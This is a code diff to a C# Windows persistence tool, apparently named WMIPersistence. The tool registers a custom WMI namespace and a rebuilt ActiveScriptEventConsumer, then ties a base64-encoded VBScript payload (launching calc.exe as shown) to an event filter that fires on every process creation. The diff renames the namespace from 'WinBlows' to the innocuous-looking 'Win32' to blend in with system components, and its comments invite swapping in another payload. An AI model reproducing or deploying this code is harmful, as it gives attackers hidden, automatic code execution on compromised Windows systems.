@@ -16,21 +16,21 @@ namespace WMIPersistence
         {
             try
             {
-                // Create namespace named WinBlows
+                // Create namespace named Win32
                 ManagementObject nameSpace = null;
 
                 ManagementScope rootscope = new ManagementScope(@"root");
 
                 ManagementClass wmiNameSpace = new ManagementClass(rootscope, new ManagementPath("__Namespace"), null);
                 nameSpace = wmiNameSpace.CreateInstance();
-                nameSpace["Name"] = "WinBlows";
+                nameSpace["Name"] = "Win32";
                 nameSpace.Put();
                 
                 Console.WriteLine("[*] Namespace created!");
 
 
                 // Derive base class
-                ManagementClass eventConsumerBase = new ManagementClass("Root\\WinBlows", "__EventConsumer", null);
+                ManagementClass eventConsumerBase = new ManagementClass("Root\\Win32", "__EventConsumer", null);
                 ManagementClass newActiveScriptEventConsumer = eventConsumerBase.Derive("ActiveScriptEventConsumer");
 
                 // Add properties to turn base class into facimale of ActiveScriptEventConsumer class
@@ -55,7 +55,7 @@ namespace WMIPersistence
 
                 // The new class needs to be bound to a provider and registed 
                 // First we bind the class to a provider
-                ManagementScope scope = new ManagementScope(@"\\.\root\WinBlows");
+                ManagementScope scope = new ManagementScope(@"\\.\root\Win32");
                 ManagementObject newActiveScriptEventConsumerProviderBinding = null;
                 ManagementObject eventConsumerProviderRegistration = null;
 
@@ -91,13 +91,15 @@ namespace WMIPersistence
             ManagementObject eventConsumer = null;
             ManagementObject evtToConsBinder = null;
 
+            // Change this payload
             string vbscript64 = "RGltIHNobA0KU2V0IHNobCA9IENyZWF0ZU9iamVjdCgiV3NjcmlwdC5TaGVsbCIpDQpDYWxsIHNobC5SdW4oIiIiY2FsYy5leGUiIiIpDQpTZXQgc2hsID0gTm90aGluZw0KV1NjcmlwdC5RdWl0";
             string vbscript = Encoding.UTF8.GetString(Convert.FromBase64String(vbscript64));
             try
             {
-                ManagementScope scope = new ManagementScope(@"\\.\root\WinBlows");
+                ManagementScope scope = new ManagementScope(@"\\.\root\Win32");
                 
                 ManagementClass wmiEventFilter = new ManagementClass(scope, new ManagementPath("__EventFilter"), null);
+                // Change this WQL query
                 String strQuery = @"SELECT * FROM __InstanceCreationEvent WITHIN 5 " +
                     "WHERE TargetInstance ISA \"Win32_Process\"";
 
